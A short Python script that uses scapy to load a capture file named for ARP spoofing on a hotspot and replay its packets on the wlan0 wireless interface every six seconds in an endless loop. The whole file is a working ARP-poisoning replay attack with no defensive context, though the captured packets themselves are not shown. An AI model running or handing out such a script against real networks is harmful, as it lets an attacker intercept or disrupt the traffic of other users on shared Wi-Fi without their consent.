from scapy.all import rdpcap, sendp
import time



PCAP_FILE_PATH = './arp_spoofing_hotspot.pcap'
packets = rdpcap(PCAP_FILE_PATH)

cnt = 0
while True:
    
    sendp(packets, iface="wlan0")

    time.sleep(6)
    
    cnt += 1
    
    #if cnt == 8:    break